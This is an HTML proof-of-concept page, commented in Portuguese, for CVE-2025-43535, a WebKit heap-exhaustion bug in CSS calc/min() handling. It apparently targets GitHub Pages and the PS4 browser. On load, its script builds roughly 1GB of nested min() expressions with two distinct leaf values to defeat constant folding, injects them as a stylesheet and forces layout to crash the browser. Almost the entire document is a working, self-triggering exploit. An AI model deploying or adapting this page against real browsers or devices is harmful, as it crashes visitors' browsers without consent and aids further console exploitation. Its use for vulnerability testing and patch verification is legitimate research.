<!DOCTYPE html>
<!--
  PoC FINAL: CVE-2025-43535
  WebKit CSS Math — CSSCalcValue heap exhaustion

  SEM blob: URL · SEM Service Worker · Funciona no GitHub Pages
  ════════════════════════════════════════════════════════════

  PROBLEMA ANTERIOR (TextNode com '1px'):
    min(1px, 1px) → constant-folding → WebKit descarta um ramo
    → custo O(N) em vez de O(2^N) → sem crash

  SOLUÇÃO — DUAS FOLHAS DISTINTAS:
    c16_A (folha '1px') e c16_B (folha '2px') — cada um 576KB
    Árvore: min( sym10_A, min( sym9_B, min(sym8_A, sym6_B) ) )
    Cada nó min() tem sub-árvores com valores distintos:
      min(tree→1px, tree→2px) → resultados ≠ → WebKit DEVE
      avaliar ambos → sem constant-fold → 122M objetos → crash

  MECANISMO DE ENTREGA (sem blob: URL):
    <style> element com TextNodes — o mesmo CSS parser do WebKit
    que processa stylesheets externas processa o textContent do
    <style>. A diferença de constante-folding não é do mecanismo
    de entrega, mas do conteúdo. Com folhas distintas, o conteúdo
    força a avaliação completa independente do caminho de entrega.

  COMPARAÇÃO FINAL:
  ┌──────────────────┬──────────┬───────────────────────────┐
  │ Versão           │ JS heap  │ Funciona no GitHub/PS4    │
  ├──────────────────┼──────────┼───────────────────────────┤
  │ BASE=24 Blob     │ 144 MB   │ OOM antes de criar Blob   │
  │ Service Worker   │ < 1 MB   │ SW não suportado no PS4   │
  │ BASE=16 Blob     │ < 1 MB   │ CSP bloqueia blob: URL    │
  │ TextNode '1px'   │ < 1 MB   │ Constant-fold → sem crash │
  │ TextNode A+B ←✓  │ ~1.2 MB  │ SIM — sem blob, sem SW    │
  └──────────────────┴──────────┴───────────────────────────┘
-->
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace;
         padding:16px; margin:0; font-size:13px; }
  #log { background:#111; border:1px solid #2a4a2a; padding:10px;
         height:72vh; overflow-y:auto; font-size:11px; line-height:1.7; }
  .ok    { color:#00ff88 }
  .fail  { color:#ff4444 }
  .info  { color:#ffcc44 }
  .warn  { color:#ff8844 }
  .crash { color:#ff44ff; font-weight:bold }
  .dim   { color:#336633 }
  .bar   { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44;
           padding:6px 10px; margin-bottom:8px; font-size:11px; }
</style>
</head>
<body>
<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
  CVE-2025-43535 · TextNode A+B · JS~1.2MB · sem blob · GitHub/PS4
</div>
<div class="bar" id="bar">Aguardando...</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;
                       width:1px;height:1px;overflow:hidden"></div>

<script>
"use strict";

var logEl = document.getElementById('log');
var barEl = document.getElementById('bar');
var stage = document.getElementById('stage');

function L(m, c) {
  logEl.innerHTML += '<div class="'+(c||'dim')+'">' + m + '</div>';
  logEl.scrollTop = logEl.scrollHeight;
}
function bar(m) { barEl.textContent = m; }

// ─────────────────────────────────────────────────────────────
// buildDepth: constrói c16 com uma folha customizada.
// c16_A ('1px') = 576KB · c16_B ('2px') = 576KB
// ─────────────────────────────────────────────────────────────
function buildDepth(depth, leaf) {
  var e = leaf;
  for (var d = 1; d <= depth; d++) {
    var n = 'min(' + e + ',' + e + ')';
    e = null; e = n;
  }
  return e;
}

// ─────────────────────────────────────────────────────────────
// insertSym: insere uma árvore simétrica via TextNodes no parent.
// levels níveis acima do leaf. Recursão máxima = 10 → sem risk.
// leaf é uma STRING referenciada, não duplicada.
// ─────────────────────────────────────────────────────────────
function insertSym(parent, levels, leaf) {
  if (levels === 0) {
    parent.appendChild(document.createTextNode(leaf));
    return;
  }
  parent.appendChild(document.createTextNode('min('));
  insertSym(parent, levels - 1, leaf);
  parent.appendChild(document.createTextNode(','));
  insertSym(parent, levels - 1, leaf);
  parent.appendChild(document.createTextNode(')'));
}

// ─────────────────────────────────────────────────────────────
// insertMin: insere min(left_tree, right_tree) via TextNodes.
// left e right são funções que inserem seus sub-trees.
// ─────────────────────────────────────────────────────────────
function insertMin(parent, insertLeft, insertRight) {
  parent.appendChild(document.createTextNode('min('));
  insertLeft(parent);
  parent.appendChild(document.createTextNode(','));
  insertRight(parent);
  parent.appendChild(document.createTextNode(')'));
}

// ─────────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────────
function run() {
  L('CVE-2025-43535 · TextNode A+B · sem blob: URL', 'info');
  L('Threshold PS4 FW 13.04: >1021.5MB = crash', 'info');
  L('Folha A=1px · Folha B=2px → sem constant-fold', 'info');
  L('', '');

  // ── Fase 1: construir os dois chunks de 576KB cada ────────
  bar('[1/4] Construindo c16_A (1px) e c16_B (2px)...');
  L('[1/4] buildDepth(16, "1px") e buildDepth(16, "2px")...', 'warn');

  setTimeout(function() {

    var cA, cB;
    try {
      cA = buildDepth(16, '1px');
      cB = buildDepth(16, '2px');
      L('[1/4] cA: ' + (cA.length/1024).toFixed(0) + 'KB (folha=1px) ✓', 'ok');
      L('[1/4] cB: ' + (cB.length/1024).toFixed(0) + 'KB (folha=2px) ✓', 'ok');
      L('[1/4] JS heap total: ~' + ((cA.length+cB.length)/1024).toFixed(0) + 'KB ✓', 'ok');
    } catch(e) {
      L('[1/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
    }

    // ── Fase 2: montar <style> com TextNodes ─────────────────
    //
    // Estrutura (1044MB, 122M nós):
    //   min(
    //     sym(10, cA),                    ← 576MB  folha=1px
    //     min(
    //       sym(9, cB),                   ← 288MB  folha=2px
    //       min(
    //         sym(8, cA),                 ← 144MB  folha=1px
    //         sym(6, cB)                  ←  36MB  folha=2px
    //       )
    //     )
    //   )
    //
    // Cada nó min() recebe sub-árvores com folhas diferentes:
    //   min(→1px, →2px) → WebKit avalia ambos → sem constant-fold
    //
    bar('[2/4] Inserindo TextNodes no <style>...');
    L('[2/4] Montando 1044MB via TextNodes offline...', 'warn');
    L('[2/4] sym10(1px)=576MB + sym9(2px)=288MB + sym8(1px)=144MB + sym6(2px)=36MB', 'info');

    setTimeout(function() {

      var styleEl = document.createElement('style');
      // Montar OFFLINE — sem estar no DOM ainda
      // → o CSS parser só é invocado no appendChild ao head

      try {
        styleEl.appendChild(document.createTextNode('.t{width:'));

        // Árvore principal: min(sym10_A, min(sym9_B, min(sym8_A, sym6_B)))
        insertMin(styleEl,
          function(p) { insertSym(p, 10, cA); },          // 576MB
          function(p) {
            insertMin(p,
              function(p2) { insertSym(p2, 9, cB); },     // 288MB
              function(p2) {
                insertMin(p2,
                  function(p3) { insertSym(p3, 8, cA); }, // 144MB
                  function(p3) { insertSym(p3, 6, cB); }  //  36MB
                );
              }
            );
          }
        );

        styleEl.appendChild(document.createTextNode(';}'));

        var nodeCount = styleEl.childNodes.length;
        L('[2/4] ' + nodeCount + ' TextNodes inseridos ✓', 'ok');

        // Liberar as strings do JS heap
        // (os TextNodes têm suas próprias cópias)
        cA = null; cB = null;
        L('[2/4] cA e cB liberados do JS heap ✓', 'ok');

      } catch(e) {
        cA = null; cB = null;
        L('[2/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
      }

      // ── Fase 3: conectar ao DOM → CSS parser recebe 1044MB ─
      bar('[3/4] Conectando ao DOM...');
      L('[3/4] appendChild → CSS parser recebe 1044MB de uma vez...', 'warn');
      L('[3/4] min(→1px, →2px) em cada nó → sem constant-fold', 'warn');
      L('[3/4] ◀◀ SE O BROWSER FECHAR: CRASH = CVE PRESENTE ▶▶', 'crash');

      var el = document.createElement('div');
      el.className = 't';
      el.style.cssText = 'position:absolute;visibility:hidden';
      stage.appendChild(el);

      setTimeout(function() {
        try {
          // TRIGGER — parse de 1044MB acontece aqui
          document.head.appendChild(styleEl);
          L('[3/4] Stylesheet conectada ✓', 'ok');
        } catch(e) {
          L('[3/4] ' + e, 'fail');
        }

        // ── Fase 4: forçar layout ─────────────────────────────
        bar('[4/4] Forçando layout...');
        L('[4/4] offsetWidth + getComputedStyle...', 'warn');

        setTimeout(function() {
          try {
            void el.offsetWidth;
            var w = window.getComputedStyle(el).getPropertyValue('width');
            L('[4/4] width="' + w + '" ✓', 'ok');
          } catch(e) { L('[4/4] ' + e, 'fail'); }

          try { document.head.removeChild(styleEl); } catch(e) {}
          try { stage.removeChild(el); } catch(e) {}

          L('', '');
          L('═══════════════════════════════════════', 'warn');
          L('CRASH = CVE-2025-43535 PRESENTE', 'crash');
          L('SEM CRASH = PATCHED', 'ok');
          L('═══════════════════════════════════════', 'warn');
          bar('DONE');
        }, 100);
      }, 50);
    }, 80);
  }, 100);
}

window.addEventListener('load', function() { setTimeout(run, 200); });
</script>
</body>
</html>
